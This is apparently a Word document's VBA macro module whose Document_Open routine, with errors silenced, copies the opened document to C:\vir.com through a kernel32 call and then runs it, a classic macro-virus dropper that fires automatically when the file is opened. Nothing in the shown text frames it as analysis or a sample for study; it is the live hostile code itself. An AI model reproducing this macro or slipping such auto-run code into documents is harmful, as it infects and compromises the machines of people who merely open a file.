Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Private Declare Sub CopyFileA Lib "kernel32" (ByVal src As String, ByVal dst As String, ByVal mode As Long)
Sub Document_Open()
On Error Resume Next
CopyFileA ActiveDocument.Name, "C:\vir.com", 0
ChDir "C:\"
Shell "C:\vir.com", 4
End Sub

